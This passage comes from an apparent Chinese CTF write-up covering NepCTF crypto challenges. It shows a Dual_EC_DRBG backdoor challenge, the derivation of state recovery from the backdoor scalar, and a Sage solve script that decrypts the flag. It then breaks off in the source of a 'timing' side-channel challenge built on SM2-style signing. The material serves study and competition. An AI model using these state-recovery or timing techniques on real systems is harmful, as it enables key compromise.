&gt;&gt; ((<span class="number">32</span>*req - N)*<span class="number">8</span>)</span><br><span class="line">        <span class="keyword">return</span> long_to_bytes(result)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_flag</span>(<span class="params">key:<span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">    <span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line">    <span class="keyword">from</span> FLAG3 <span class="keyword">import</span> flag</span><br><span class="line">    </span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    flag_pad = pad(flag, <span class="number">16</span>)</span><br><span class="line">    ct = cipher.encrypt(flag_pad)</span><br><span class="line">    <span class="keyword">return</span> ct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">do_schnorr_identification</span>(<span class="params">dbrg</span>):</span><br><span class="line">    p = getPrime(<span class="number">256</span>)</span><br><span class="line">    Zp = Zmod(p)</span><br><span class="line">    g = Zp(<span class="number">2</span>)</span><br><span class="line">    q = g.multiplicative_order()</span><br><span class="line">    Zq = Zmod(q)</span><br><span class="line">    k = <span class="number">10</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">SchnorrProver</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">            self.secret_key = Zq.random_element()</span><br><span class="line">            self.public_key = g^self.secret_key</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">commit</span>(<span class="params">self</span>):</span><br><span class="line">            self.r = Zq.random_element()</span><br><span class="line">            <span class="keyword">return</span> g^self.r</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">respond</span>(<span class="params">self, challenge</span>):</span><br><span class="line">            <span class="keyword">return</span> self.r - challenge*self.secret_key</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">SchnorrVerifier</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, prover_public_key</span>):</span><br><span class="line">            self.prover_public_key = prover_public_key</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">challenge</span>(<span class="params">self, commitment</span>):</span><br><span class="line">            self.commitment = commitment</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                c = bytes_to_long(dbrg.getRandomNBytes(<span class="number">32</span>))</span><br><span class="line">                <span class="keyword">if</span> c &lt; p:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            self.challenge_number = c</span><br><span class="line">            <span class="keyword">return</span> self.challenge_number</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, response</span>):</span><br><span class="line">            check_value = g^response*self.prover_public_key^self.challenge_number</span><br><span class="line">            <span class="keyword">return</span> self.commitment == check_value</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run_protocol</span>(<span class="params">iterations=<span class="number">1</span></span>):</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(iterations):</span><br><span class="line">            prover = SchnorrProver()</span><br><span class="line">            verifier = SchnorrVerifier(prover.public_key)</span><br><span class="line">            t = prover.commit()</span><br><span class="line">            c = verifier.challenge(t)</span><br><span class="line">            s = prover.respond(c)</span><br><span class="line">            <span class="keyword">assert</span>(verifier.check(s))</span><br><span class="line">            </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line">            </span><br><span class="line">    run_protocol()</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    dbrg = Dual_EC()</span><br><span class="line">    do_schnorr_identification(dbrg)</span><br><span class="line">    key = dbrg.getRandomNBytes(<span class="number">16</span>)</span><br><span class="line">    ct = encrypt_flag(key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;ct = <span class="subst">&#123;bytes_to_long(ct)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># curve = Elliptic Curve defined by y^2 = x^3 + 115792089210356248762697446949407573530086143415290314195533631308867097853948*x + 41058363725152142129326129780047268409114441015993725554835256314039467401291 over Finite Field of size 115792089210356248762697446949407573530086143415290314195533631308867097853951</span><br><span class="line"># P = (72696788778535848020209987825324097844942627382508830211685965810687985426258 : 49180397040468497821240854375656422791216946832858522054245540263375986110762 : 1)</span><br><span class="line"># d = 66604141534275704476445937214374130642068729921454877238730830814793201802544</span><br><span class="line"># Q = (48439561293906451759052585252797914202762949526041747995844080717082404635286 : 36134250956749795798585127919587881956611106672985015071877198253568414405109 : 1)</span><br><span class="line"># c = 59100197418944667413449341413044666843726352095054393072750502893110293231642</span><br><span class="line"># ct = 25645992443585671366815910836517434170297823176311632150463962979581372384075859802765045877741181123347569267185176</span><br></pre></td></tr></table></figure></blockquote><p>双椭圆曲线确定性随机数发生器（Dual_EC_DRBG）的一个后门，原理：</p><p>设每一步的 $\text{state}$ 为 $s_i$，随机数为 $r_i$，随机数对应的椭圆曲线上的点为 $R_i$。</p><p>对于攻击者来说，已知 $P$、$Q$、$d$、$r_{i-1}$，而 $s_i$ 未知。于是有：</p><p>$\begin{cases} ((s_i \cdot P)_x \cdot P)_x &amp; \rightarrow s_{i+1} \newline ((s_i \cdot P)_x \cdot Q)_x &amp; \rightarrow r_i \end{cases}$</p><p>后门为构造 $d \cdot r_{i-1}$，其恰好是 $s_i$，看似安全的体制被攻破。</p><p>记 $k_i = (s_i \cdot P)_x$，有：</p><p>$\begin{align} d \cdot r_{i-1} &amp; = {(d \cdot R_{i-1})_x = (d \cdot k_{i-1} \cdot Q)_x} = {(k_{i-1} \cdot d \cdot Q)_x = (k_{i-1} \cdot P)_x} = {((s_{i-1} \cdot P)_x \cdot P)_x = s_i} \end{align}$</p><p>题里 $c=r_{i-1}$，构造 $d \cdot c = s_i$，则可以推出下一个随机数 $r_i=((s_i \cdot P)_x \cdot Q)_x$，取高16*8位为AES的Key。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">a = <span class="number">115792089210356248762697446949407573530086143415290314195533631308867097853948</span></span><br><span class="line">b = <span class="number">41058363725152142129326129780047268409114441015993725554835256314039467401291</span></span><br><span class="line">p = <span class="number">115792089210356248762697446949407573530086143415290314195533631308867097853951</span></span><br><span class="line">E = EllipticCurve(GF(p),[a,b])</span><br><span class="line">n = <span class="number">115792089210356248762697446949407573529996955224135760342422259061068512044369</span></span><br><span class="line">P = (<span class="number">72696788778535848020209987825324097844942627382508830211685965810687985426258</span>, <span class="number">49180397040468497821240854375656422791216946832858522054245540263375986110762</span>)</span><br><span class="line">d = <span class="number">66604141534275704476445937214374130642068729921454877238730830814793201802544</span></span><br><span class="line">Q = (<span class="number">48439561293906451759052585252797914202762949526041747995844080717082404635286</span>, <span class="number">36134250956749795798585127919587881956611106672985015071877198253568414405109</span>)</span><br><span class="line">c = <span class="number">59100197418944667413449341413044666843726352095054393072750502893110293231642</span></span><br><span class="line">ct = <span class="number">25645992443585671366815910836517434170297823176311632150463962979581372384075859802765045877741181123347569267185176</span></span><br><span class="line"></span><br><span class="line">P = E(P)</span><br><span class="line">Q = E(Q)</span><br><span class="line">R0 = E.lift_x(c)</span><br><span class="line">s1 = (d*R0)[<span class="number">0</span>]</span><br><span class="line">s2 = ((s1*P)[<span class="number">0</span>]*P)[<span class="number">0</span>]</span><br><span class="line">r1 = ((s1*P)[<span class="number">0</span>]*Q)[<span class="number">0</span>]</span><br><span class="line">key = r1 &gt;&gt; ((<span class="number">32</span> - <span class="number">16</span>)*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">key = long_to_bytes(key)</span><br><span class="line">ct = long_to_bytes(ct)</span><br><span class="line"><span class="built_in">print</span>(cipher.decrypt(ct))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;NepCTF&#123;NS4_b4ckd00r_1n_ps3ud0_r4nd0m_g3n3r4t0r&#125;\x01&#x27; </span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="timing"><a href="#timing" class="headerlink" title="timing"></a>timing</h3><blockquote><p>牢不可破的算法，或许会在其他地方出现问题？<br>(容器下发后，师傅自行nc哦～～～)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> perf_counter_ns <span class="keyword">as</span> clock1</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ecc_table = &#123;</span><br><span class="line">    <span class="string">&#x27;n&#x27;</span>: <span class="string">&#x27;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFF7203DF6B21C6052B53BBF40939D54123&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;p&#x27;</span>: <span class="string">&#x27;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00000000FFFFFFFFFFFFFFFF&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;g&#x27;</span>: <span class="string">&#x27;32c4ae2c1f1981195f9904466a39c9948fe30bbff2660be1715a4589334c74c7&#x27;</span></span><br><span class="line">         <span class="string">&#x27;bc3736a2f4f6779c59bdcee36b692153d0a9877cc62a474002df32e52139f0a0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00000000FFFFFFFFFFFFFFFC&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;b&#x27;</span>: <span class="string">&#x27;28E9FA9E9D9F5E344D5A9E4BCF6509A7F39789F515AB8F92DDBCBD414D940E93&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;O&#x27;</span>: <span class="string">&#x27;0000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class="line">         <span class="string">&#x27;0000000000000000000000000000000000000000000000000000000000000000&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TSM2</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, sk</span>):</span><br><span class="line">        self.ecc_table = ecc_table</span><br><span class="line">        self.n = <span class="built_in">int</span>(ecc_table[<span class="string">&#x27;n&#x27;</span>], <span class="number">16</span>)</span><br><span class="line">        self.para_len = <span class="built_in">len</span>(ecc_table[<span class="string">&#x27;n&#x27;</span>])</span><br><span class="line">        self.ecc_a3 = (<span class="built_in">int</span>(ecc_table[<span class="string">&#x27;a&#x27;</span>], base=<span class="number">16</span>) +</span><br><span class="line">                       <span class="number">3</span>) % <span class="built_in">int</span>(ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">        self.sk = sk</span><br><span class="line">        self.pk = self.kg(self.sk, ecc_table[<span class="string">&#x27;g&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">self, data, K</span>):</span><br><span class="line">        e = data</span><br><span class="line">        d = self.sk</span><br><span class="line">        k = K</span><br><span class="line"></span><br><span class="line">        P1 = self.kg(k, self.ecc_table[<span class="string">&#x27;g&#x27;</span>])</span><br><span class="line">        x = <span class="built_in">int</span>(P1[<span class="number">0</span>:self.para_len], <span class="number">16</span>)</span><br><span class="line">        R = ((e + x) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;n&#x27;</span>], base=<span class="number">16</span>))</span><br><span class="line">        <span class="keyword">if</span> R == <span class="number">0</span> <span class="keyword">or</span> R + k == <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;n&#x27;</span>], base=<span class="number">16</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        d_1 = <span class="built_in">pow</span>(</span><br><span class="line">            d+<span class="number">1</span>, <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;n&#x27;</span>], base=<span class="number">16</span>) - <span class="number">2</span>, <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;n&#x27;</span>], base=<span class="number">16</span>))</span><br><span class="line">        S = (d_1*(k + R) - R) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;n&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> S == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;%064x%064x&#x27;</span> % (R, S)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">self, Sign, data</span>):</span><br><span class="line">        r = <span class="built_in">int</span>(Sign[<span class="number">0</span>:self.para_len], <span class="number">16</span>)</span><br><span class="line">        s = <span class="built_in">int</span>(Sign[self.para_len:<span class="number">2</span> * self.para_len], <span class="number">16</span>)</span><br><span class="line">        e = <span class="built_in">int</span>(data.<span class="built_in">hex</span>(), <span class="number">16</span>)</span><br><span class="line">        t = (r + s) % self.n</span><br><span class="line">        <span class="keyword">if</span> t == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        P1 = self.kg(s, self.ecc_table[<span class="string">&#x27;g&#x27;</span>])</span><br><span class="line">        P2 = self.kg(t, self.pk)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> P1 == P2:</span><br><span class="line">            P1 = <span class="string">&#x27;%s%s&#x27;</span> % (P1, <span class="number">1</span>)</span><br><span class="line">            P1 = self._double_point(P1)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            P1 = <span class="string">&#x27;%s%s&#x27;</span> % (P1, <span class="number">1</span>)</span><br><span class="line">            P1 = self._add_point(P1, P2)</span><br><span class="line">            P1 = self._convert_jacb_to_nor(P1)</span><br><span class="line"></span><br><span class="line">        x = <span class="built_in">int</span>(P1[<span class="number">0</span>:self.para_len], <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">return</span> r == ((e + x) % self.n)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">kg</span>(<span class="params">self, k, Point</span>):</span><br><span class="line">        k=k%self.n</span><br><span class="line">        <span class="keyword">if</span> k == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;0&#x27;</span> * <span class="number">128</span></span><br><span class="line">        Point = <span class="string">&#x27;%s%s&#x27;</span> % (Point, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        mask_str = <span class="string">&#x27;8&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.para_len - <span class="number">1</span>):</span><br><span class="line">            mask_str += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        mask = <span class="built_in">int</span>(mask_str, <span class="number">16</span>)</span><br><span class="line">        Temp = Point</span><br><span class="line">        flag = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(self.para_len * <span class="number">4</span>):</span><br><span class="line">            <span class="keyword">if</span> flag:</span><br><span class="line">                Temp = self._double_point(Temp)</span><br><span class="line">            <span class="keyword">if</span> (k &amp; mask) != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">if</span> flag:</span><br><span class="line">                    Temp = self._add_point(Temp, Point)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    flag = <span class="literal">True</span></span><br><span class="line">                    Temp = Point</span><br><span class="line">            k = k &lt;&lt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> self._convert_jacb_to_nor(Temp)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_double_point</span>(<span class="params">self, Point</span>):</span><br><span class="line">        t1=clock1()</span><br><span class="line">        l = <span class="built_in">len</span>(Point)</span><br><span class="line">        len_2 = <span class="number">2</span> * self.para_len</span><br><span class="line">        <span class="keyword">if</span> l &lt; self.para_len * <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            x1 = <span class="built_in">int</span>(Point[<span class="number">0</span>:self.para_len], <span class="number">16</span>)</span><br><span class="line">            y1 = <span class="built_in">int</span>(Point[self.para_len:len_2], <span class="number">16</span>)</span><br><span class="line">            <span class="keyword">if</span> l == len_2:</span><br><span class="line">                z1 = <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                z1 = <span class="built_in">int</span>(Point[len_2:], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">            T6 = (z1 * z1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T2 = (y1 * y1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T3 = (x1 + T6) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T4 = (x1 - T6) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T1 = (T3 * T4) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T3 = (y1 * z1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T4 = (T2 * <span class="number">8</span>) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T5 = (x1 * T4) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T1 = (T1 * <span class="number">3</span>) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T6 = (T6 * T6) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T6 = (self.ecc_a3 * T6) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T1 = (T1 + T6) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            z3 = (T3 + T3) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T3 = (T1 * T1) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            T2 = (T2 * T4) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            x3 = (T3 - T5) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (T5 % <span class="number">2</span>) == <span class="number">1</span>:</span><br><span class="line">                T4 = (T5 + ((T5 + <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)) &gt;&gt; <span class="number">1</span>) - T3) % <span class="built_in">int</span>(</span><br><span class="line">                    self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                T4 = (T5 + (T5 &gt;&gt; <span class="number">1</span>) - T3) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">            T1 = (T1 * T4) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line">            y3 = (T1 - T2) % <span class="built_in">int</span>(self.ecc_table[<span class="string">&#x27;p&#x27;</span>], base=<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">            form = <span class="string">&#x27;%%0%dx&#x27;</span> % self.para_len</span><br><span class="line">            form = form * <span class="number">3</span></span><br><span class="line">            t2=clock1()</span><br><span class="line">            <span class="keyword">if</span>(t2-t1&lt;<span class="number">1e7</span>):</span><br><span class="line">                sleep(<span class="number">0.01</span>-(((t2-t1))/<span class="number">1000000000.0</span>))</span><br><span class="line">            <span class="keyword">return</span> form % (x3, y3, z3)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_add_point</span>(<span class="params">self, P1, P2</span>):</span><br><span class="line">        t1=clock1()</span><br><span class="line">        <span class="keyword">if</span> P1 == <span class="string">&#x27;0&#x27;</span> * <span class="number">128</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;%s%s&#x27;</span> % (P2, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> P2 == <span class="string">&#x27;0&#x27;</span> * <span class="number">128</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;%s%s&#x27;</span> % (P1, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        len_2 = <span class="number">2</span> * self.para_len</span><br><span class="line">        l1 = <span class="built_in">len</span>(P1)</span><br><span class="line">        l2 = <span class="built_in">len</span>(P2)</span><br><span class="line">        <span class="keyword">if</span> (l1 &lt; len_2) <span 